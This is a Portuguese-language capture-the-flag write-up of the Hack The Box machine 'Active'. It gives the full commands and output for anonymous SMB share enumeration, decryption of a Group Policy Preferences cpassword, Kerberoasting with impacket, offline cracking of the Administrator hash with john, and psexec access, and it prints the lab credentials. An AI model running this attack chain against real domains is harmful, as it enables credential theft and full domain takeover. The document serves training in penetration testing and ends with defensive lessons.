# Write-up: Active - Hack The Box

> Data: 22 de Maio de 2026  
> Target IP: `10.129.2.108`

![STATUS](https://img.shields.io/badge/STATUS-COMPROMETIMENTO%20TOTAL-brightgreen?style=flat-square) ![INITIAL ACCESS](https://img.shields.io/badge/INITIAL%20ACCESS-GPP%20PASSWORD-grey?style=flat-square) ![TECHNIQUE](https://img.shields.io/badge/TECHNIQUE-KERBEROASTING-orange?style=flat-square) ![PRIVESC](https://img.shields.io/badge/PRIVESC-TGS%20CRACK-red?style=flat-square) ![ACCESS](https://img.shields.io/badge/ACCESS-PSEXEC-blue?style=flat-square)

O desafio **Active** é um Domain Controller Windows Server 2008 R2 com Active Directory, focado em enumeração anônima de shares SMB, extração e descriptografia de senhas armazenadas em arquivos GPP (Group Policy Preferences) e exploração de Kerberoasting contra a conta Administrator para obter controle total do domínio.

---


## Fase 1 - Reconhecimento

### Configuração inicial

```bash
echo "10.129.2.108 active.htb" | sudo tee -a /etc/hosts
```

### Scan de Portas

```bash
nmap -sV -sC -T4 -Pn 10.129.2.108
```

**Resultado relevante:**
```
53/tcp   open  domain   Microsoft DNS 6.1.7601 (Windows Server 2008 R2 SP1)
88/tcp   open  kerberos-sec
139/tcp  open  netbios-ssn
389/tcp  open  ldap     (Domain: active.htb)
445/tcp  open  microsoft-ds
3268/tcp open  ldap     (Domain: active.htb)
```

**Análise:** Domain Controller clássico rodando Windows Server 2008 R2, bem antigo, o que já sugere configurações legadas e potencialmente vulneráveis. O SMB sem autenticação foi meu primeiro alvo.

---

## Fase 2 - Enumeração SMB

### Listando Shares

```bash
smbclient -L //10.129.2.108 -N
```

**Resultado:**
```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share
Replication     Disk
SYSVOL          Disk      Logon server share
Users           Disk
```

O share **Replication** sem comentário e acessível anonimamente chamou minha atenção, é uma cópia do SYSVOL, que frequentemente contém arquivos de GPO com credenciais.

### Baixando o conteúdo do share

```bash
mkdir -p ~/HTB/Active
smbclient //10.129.2.108/Replication -N -c "recurse ON; prompt OFF; mget *"
```

### Encontrando o arquivo crítico

```bash
find ~/HTB/Active -type f
```

**Resultado:**
```
.../Policies/{31B2F340...}/MACHINE/Preferences/Groups/Groups.xml  ← BAZINGA!
.../Policies/{31B2F340...}/MACHINE/Registry.pol
.../Policies/{31B2F340...}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf
.../Policies/{6AC1786C...}/GPT.INI
.../Policies/{6AC1786C...}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf
```

---

## Fase 3 - GPP Password Decryption

### Lendo o Groups.xml

```bash
cat ".../MACHINE/Preferences/Groups/Groups.xml"
```

**Conteúdo:**
```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
  <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" 
        name="active.htb\SVC_TGS" 
        changed="2018-07-18 20:46:06">
    <Properties 
      cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
      userName="active.htb\SVC_TGS"/>
  </User>
</Groups>
```

O campo `cpassword` é a senha do `SVC_TGS` criptografada com **AES-256**, mas a Microsoft cometeu o erro histórico de publicar a chave de descriptografia em um KB em 2012. Qualquer um pode quebrar isso.

### Descriptografando com gpp-decrypt

```bash
gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
```

**Resultado:**
```
GPPstillStandingStrong2k18
```

**Credenciais obtidas:** `SVC_TGS : GPPstillStandingStrong2k18`

---

## Fase 4 - Kerberoasting

Com credenciais válidas, agora posso fazer Kerberoasting, procurar service accounts com SPNs registrados e solicitar tickets TGS que podem ser crackeados offline.

```bash
impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 \
  -dc-ip 10.129.2.108 -request
```

**Resultado:**
```
ServicePrincipalName  Name           MemberOf
--------------------  -------------  --------------------------------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners...

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$...
```

A conta **Administrator** tem um SPN registrado, algo incomum e perigoso. O TGS foi capturado e pode ser crackeado offline.

### Quebrando o hash TGS

```bash
echo '$krb5tgs$23$*Administrator$ACTIVE.HTB$...' > ~/HTB/Active/admin.hash
john ~/HTB/Active/admin.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

**Resultado:**
```
Ticketmaster1968    (Administrator)
```

**Credenciais:** `Administrator : Ticketmaster1968`

---

## Fase 5 - Acesso como Administrator

```bash
impacket-psexec active.htb/Administrator:Ticketmaster1968@10.129.2.108
```

### Flags

```powershell
# User Flag
type C:\Users\SVC_TGS\Desktop\user.txt

# Root Flag
type C:\Users\Administrator\Desktop\root.txt
```

---

## 🚩 Flags

| Flag | Hash |
|------|------|
| User | `2xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx` |
| Root | `cfxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx` |

---

## 📚 Aprendizados

### 1. GPP Passwords - uma vulnerabilidade histórica
Antes do MS14-025 (2014), administradores podiam armazenar senhas em arquivos Group Policy Preferences (Groups.xml, Drives.xml, etc.). A Microsoft criptografava com AES-256 mas publicou a chave no próprio site. Qualquer arquivo Groups.xml com `cpassword` é imediatamente explorável com `gpp-decrypt`.

### 2. SYSVOL é público por design
O SYSVOL precisa ser acessível a todos os usuários do domínio para distribuir políticas de grupo. Isso significa que qualquer `cpassword` armazenado lá está exposto a qualquer usuário autenticado, e neste caso, até anônimo via share Replication.

### 3. Kerberoasting - por que o SPN do Administrator é perigoso
Contas com SPNs registrados podem ter seus tickets TGS solicitados por qualquer usuário autenticado. Se a senha for fraca, o hash é crackeado offline sem gerar alertas no DC. Registrar SPN na conta Administrator é um erro grave de configuração.

### 4. O encadeamento é o ataque
Nenhuma das vulnerabilidades sozinha comprometeria o domínio. A cadeia completa: SMB anônimo → GPP → credenciais → Kerberoasting → Admin é o que torna esse ataque devastador. Em pentest real, sempre pense em encadeamento.

### 5. Senhas fracas destroem criptografia forte
O AES-256 do GPP não importou a senha `Ticketmaster1968` estava no rockyou.txt. A força da criptografia é inútil se a senha subjacente for fraca.

---

## 🛠️ Ferramentas Utilizadas

| Ferramenta | Uso |
|------------|-----|
| `nmap` | Scan de portas e serviços |
| `smbclient` | Enumeração e download de shares SMB |
| `gpp-decrypt` | Descriptografia de senhas GPP |
| `impacket-GetUserSPNs` | Kerberoasting - captura de TGS |
| `john` | Crack do hash Kerberos TGS |
| `impacket-psexec` | Acesso remoto como Administrator |

---

## 🔗 Referências

- [MS14-025 - GPP Password Vulnerability](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-025)
- [Impacket Tools](https://github.com/fortra/impacket)

---

<div align="center">
  <p>Escrito por:</p>
  <a href="https://www.linkedin.com/in/ralph-sonato-77086b16b/"><img src="https://img.shields.io/badge/LinkedIn-Ralph_Sonato-0e76a8?style=for-the-badge&logo=linkedin&logoColor=white"></a>
  <p><i>Analista de Cibersegurança</i></p>
</div>
